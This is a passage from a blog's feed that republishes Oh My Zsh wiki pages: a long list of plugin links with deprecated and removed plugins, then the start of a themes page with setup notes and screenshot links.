href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fancy-ctrl-z">fancy-ctrl-z</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fasd">fasd</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fastfile">fastfile</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fbterm">fbterm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fd">fd</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fig">fig</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/firewalld">firewalld</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/flutter">flutter</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fnm">fnm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/forklift">forklift</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fossil">fossil</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/frontend-search">frontend-search</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/fzf">fzf</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gas">gas</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gatsby">gatsby</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gb">gb</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gcloud">gcloud</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/geeknote">geeknote</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gem">gem</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/genpass">genpass</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gh">gh</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git">git</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-auto-fetch">git-auto-fetch</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-escape-magic">git-escape-magic</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-extras">git-extras</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gitfast">gitfast</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-flow">git-flow</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-flow-avh">git-flow-avh</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/github">github</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-hubflow">git-hubflow</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gitignore">gitignore</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-lfs">git-lfs</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git-prompt">git-prompt</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/glassfish">glassfish</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/globalias">globalias</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gnu-utils">gnu-utils</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/golang">golang</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gpg-agent">gpg-agent</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gradle">gradle</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/grails">grails</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/grc">grc</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/grunt">grunt</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/gulp">gulp</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/hanami">hanami</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/helm">helm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/heroku">heroku</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/history">history</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/history-substring-search">history-substring-search</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/hitchhiker">hitchhiker</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/hitokoto">hitokoto</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/homestead">homestead</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/httpie">httpie</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/invoke">invoke</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ionic">ionic</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ipfs">ipfs</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/isodate">isodate</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/istioctl">istioctl</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/iterm2">iterm2</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jake-node">jake-node</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jenv">jenv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jfrog">jfrog</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jhbuild">jhbuild</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jira">jira</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jruby">jruby</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jsontools">jsontools</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/juju">juju</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/jump">jump</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kate">kate</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/keychain">keychain</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kitchen">kitchen</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kn">kn</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/knife">knife</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/knife_ssh">knife_ssh</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kops">kops</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kubectl">kubectl</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kubectx">kubectx</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/kube-ps1">kube-ps1</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/lando">lando</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/laravel">laravel</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/laravel4">laravel4</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/laravel5">laravel5</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/last-working-dir">last-working-dir</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/lein">lein</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/lighthouse">lighthouse</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/lol">lol</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/lpass">lpass</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/lxd">lxd</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/macos">macos</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/macports">macports</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/magic-enter">magic-enter</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/man">man</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/marked2">marked2</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/mercurial">mercurial</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/meteor">meteor</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/microk8s">microk8s</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/minikube">minikube</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/mix">mix</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/mix-fast">mix-fast</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/mongocli">mongocli</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/mosh">mosh</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/mvn">mvn</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/mysql-macports">mysql-macports</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/n98-magerun">n98-magerun</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/nanoc">nanoc</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ng">ng</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/nmap">nmap</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/node">node</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/nomad">nomad</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/npm">npm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/nvm">nvm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/oc">oc</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/octozen">octozen</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/operator-sdk">operator-sdk</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/otp">otp</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pass">pass</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/paver">paver</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pep8">pep8</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/percol">percol</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/per-directory-history">per-directory-history</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/perl">perl</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/perms">perms</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/phing">phing</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pip">pip</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pipenv">pipenv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pj">pj</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/please">please</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pm2">pm2</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pod">pod</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/poetry">poetry</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/postgres">postgres</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pow">pow</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/powder">powder</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/powify">powify</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/profiles">profiles</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pyenv">pyenv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/pylint">pylint</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/python">python</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rails">rails</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rake">rake</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rake-fast">rake-fast</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rand-quote">rand-quote</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rbenv">rbenv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rbfu">rbfu</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rbw">rbw</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/react-native">react-native</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rebar">rebar</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/redis-cli">redis-cli</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/repo">repo</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ripgrep">ripgrep</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ros">ros</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rsync">rsync</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ruby">ruby</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rust">rust</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rvm">rvm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/safe-paste">safe-paste</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/salt">salt</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/samtools">samtools</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sbt">sbt</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/scala">scala</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/scd">scd</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/screen">screen</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/scw">scw</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sdk">sdk</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sfdx">sfdx</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sfffe">sfffe</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/shell-proxy">shell-proxy</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/shrink-path">shrink-path</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/singlechar">singlechar</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/spring">spring</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sprunge">sprunge</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ssh-agent">ssh-agent</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/stack">stack</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sublime">sublime</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sublime-merge">sublime-merge</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/sudo">sudo</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/supervisor">supervisor</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/suse">suse</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/svcat">svcat</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/svn">svn</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/svn-fast-info">svn-fast-info</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/swiftpm">swiftpm</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/symfony">symfony</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/symfony2">symfony2</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/systemadmin">systemadmin</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/systemd">systemd</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/taskwarrior">taskwarrior</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/terminitor">terminitor</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/term_tab">term_tab</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/terraform">terraform</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/textastic">textastic</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/textmate">textmate</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/thefuck">thefuck</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/themes">themes</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/thor">thor</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/tig">tig</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/timer">timer</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/tmux">tmux</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/tmux-cssh">tmux-cssh</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/tmuxinator">tmuxinator</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/torrent">torrent</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/transfer">transfer</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/tugboat">tugboat</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ubuntu">ubuntu</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/ufw">ufw</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/universalarchive">universalarchive</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/urltools">urltools</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/vagrant">vagrant</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/vagrant-prompt">vagrant-prompt</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/vault">vault</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/vim-interaction">vim-interaction</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/vi-mode">vi-mode</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/virtualenv">virtualenv</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/virtualenvwrapper">virtualenvwrapper</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/volta">volta</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/vscode">vscode</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/vundle">vundle</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/wakeonlan">wakeonlan</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/wd">wd</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/web-search">web-search</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/wp-cli">wp-cli</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/xcode">xcode</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/yarn">yarn</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/yii">yii</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/yii2">yii2</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/yum">yum</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/z">z</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/zbell">zbell</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/zeus">zeus</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/zoxide">zoxide</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/zsh-interactive-cd">zsh-interactive-cd</a></li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/zsh-navigation-tools">zsh-navigation-tools</a></li></ul><h3 id="Deprecated"><a href="#Deprecated" class="headerlink" title="Deprecated"></a>Deprecated</h3><ul><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/cargo">cargo</a>: moved to the <code>rust</code> plugin.</li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/npx">npx</a>: new npm versions (&gt;&#x3D;7.0.0) do not provide the same functionality.</li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/osx">osx</a>: renamed to <code>macos</code>.</li><li><a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/rustup">rustup</a>: moved to the <code>rust</code> plugin.</li></ul><h3 id="Removed"><a href="#Removed" class="headerlink" title="Removed"></a>Removed</h3><ul><li>cloudapp: removed due to <a href="https://github.com/cloudapp/api#note-the-api-is-no-longer-supported">deprecated API</a>.</li><li>django: removed because Zsh provides a better completion for Django.</li><li>fedora: use <code>dnf</code> instead.</li><li>git-remote-branch: not actively maintained.</li><li>go: use <code>golang</code> instead.</li><li>nyan: the service that the plugin relied on is no longer available.</li><li>zsh_reload: functionality baked into the CLI with <code>omz reload</code>.<br>‘+</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常用实用plugins列举&quot;&gt;&lt;a href=&quot;#常用实用plugins列举&quot; class=&quot;headerlink&quot; title=&quot;常用实用plugins列举&quot;&gt;&lt;/a&gt;常用实用plugins列举&lt;/h1&gt;&lt;p&gt;ohmyzsh自带&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
    <category term="开源项目" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="github" scheme="https://dxhm.github.io/tags/github/"/>
    
    <category term="tools" scheme="https://dxhm.github.io/tags/tools/"/>
    
    <category term="linux" scheme="https://dxhm.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>WIKI - Themes From Oh My Zsh</title>
    <link href="https://dxhm.github.io/2022/04/28/ohmyzsh-themes/"/>
    <id>https://dxhm.github.io/2022/04/28/ohmyzsh-themes/</id>
    <published>2022-04-28T15:09:52.000Z</published>
    <updated>2023-07-07T16:03:49.155Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><em>This wiki is automatically published from <a href="https://github.com/ohmyzsh/wiki">ohmyzsh&#x2F;wiki</a>. To edit this page,</em> <em>go to <a href="https://github.com/ohmyzsh/wiki">ohmyzsh&#x2F;wiki</a>, make your changes and submit a Pull Request.</em></p></blockquote><p><em>This section uses new, uniform screenshots. To see the previous section, go to [[Themes (legacy)]].</em></p><p>All the current themes can be found in the <code>themes/</code> directory in the Oh My Zsh distribution. <a href="https://github.com/robbyrussell/oh-my-zsh/tree/master/themes/">See list here.</a></p><p>In order to enable a theme, set <code>ZSH_THEME</code> to the name of the theme in your <code>~/.zshrc</code>, before sourcing Oh My Zsh; for example: <code>ZSH_THEME=robbyrussell</code> If you do not want any theme enabled, just set <code>ZSH_THEME</code> to blank: <code>ZSH_THEME=&quot;&quot;</code></p><p>Here is a collection of screenshots and descriptions of themes that have been contributed to Oh My Zsh. There are some missing from this page. If you want to add or edit descriptions, see the <a href="#theme-description-format">format description</a> at the bottom of this page.</p><h2 id="Themes"><a href="#Themes" class="headerlink" title="Themes"></a>Themes</h2><h3 id="robbyrussell"><a href="#robbyrussell" class="headerlink" title="robbyrussell"></a>robbyrussell</h3><p><em>The default that Robby Russell uses.</em></p><p><img src="https://user-images.githubusercontent.com/49100982/108254738-764b8700-716c-11eb-9a59-4deb8c8c6193.jpg" alt="robbyrussell"></p><hr><p>The rest of the themes, in alphabetical order:</p><h2 id="A"><a href="#A" class="headerlink" title="A"></a>A</h2><h3 id="af-magic"><a href="#af-magic" class="headerlink" title="af-magic"></a>af-magic</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254742-76e41d80-716c-11eb-89b0-09445ce76ff0.jpg" alt="af-magic"></p><h3 id="afowler"><a href="#afowler" class="headerlink" title="afowler"></a>afowler</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254744-777cb400-716c-11eb-9407-1463775bbc25.jpg" alt="afowler"></p><h3 id="agnoster"><a href="#agnoster" class="headerlink" title="agnoster"></a>agnoster</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254745-777cb400-716c-11eb-800a-a8cfa612253f.jpg" alt="agnoster"></p><p><a href="https://github.com/agnoster/agnoster-zsh-theme">Official repository</a></p><p>Additional setup:</p><ul><li>Install one of the <a href="https://github.com/powerline/fonts">patched fonts from Vim-Powerline</a> or <a href="https://github.com/powerline/fontpatcher">patch your own</a> for the special characters.</li><li><em>Optionally</em> set <code>DEFAULT_USER</code> to your regular username followed by prompt_context(){} in <code>~/.zshrc</code> to hide the “user@hostname” info when you’re logged in as yourself on your local machine.</li></ul><h3 id="alanpeabody"><a href="#alanpeabody" class="headerlink" title="alanpeabody"></a>alanpeabody</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254746-78154a80-716c-11eb-873a-6500b9d54219.jpg" alt="alanpeabody"></p><h3 id="amuse"><a href="#amuse" class="headerlink" title="amuse"></a>amuse</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254748-78ade100-716c-11eb-8f61-0a2bec4f671c.jpg" alt="amuse"></p><p>(You might need to install one of the <a href="https://github.com/powerline/fonts">patched powerline fonts</a> for it to look the same)</p><h3 id="apple"><a href="#apple" class="headerlink" title="apple"></a>apple</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254750-78ade100-716c-11eb-8c3b-7d529b7b4e25.jpg" alt="apple"></p><h3 id="arrow"><a href="#arrow" class="headerlink" title="arrow"></a>arrow</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254751-78ade100-716c-11eb-9135-39cbffcf406e.jpg" alt="arrow"></p><h3 id="aussiegeek"><a href="#aussiegeek" class="headerlink" title="aussiegeek"></a>aussiegeek</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254752-79467780-716c-11eb-82d4-304d04bf35bf.jpg" alt="aussiegeek"></p><h3 id="avit"><a href="#avit" class="headerlink" title="avit"></a>avit</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254755-79df0e00-716c-11eb-9069-da947bd4a3dc.jpg" alt="avit"></p><h3 id="awesomepanda"><a href="#awesomepanda" class="headerlink" title="awesomepanda"></a>awesomepanda</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254758-79df0e00-716c-11eb-8990-62f456ddd785.jpg" alt="awesomepanda"></p><h2 id="B"><a href="#B" class="headerlink" title="B"></a>B</h2><h3 id="bira"><a href="#bira" class="headerlink" title="bira"></a>bira</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254762-7a77a480-716c-11eb-8665-b4f459fd8920.jpg" alt="bira"></p><h3 id="blinks"><a href="#blinks" class="headerlink" title="blinks"></a>blinks</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254767-7b103b00-716c-11eb-9bdd-426643a53722.jpg" alt="blinks"></p><h3 id="bureau"><a href="#bureau" class="headerlink" title="bureau"></a>bureau</h3><p><img src="https://user-images.githubusercontent.com/49100982/108254768-7b103b00-716c-11eb-92e1-ebd7486d6f13.jpg" alt="bureau"></p><p>To use: In the right prompt you see git status and (if you use nvm) the Node.js version.</p><h2 id="C"><a href="#C" class="headerlink" 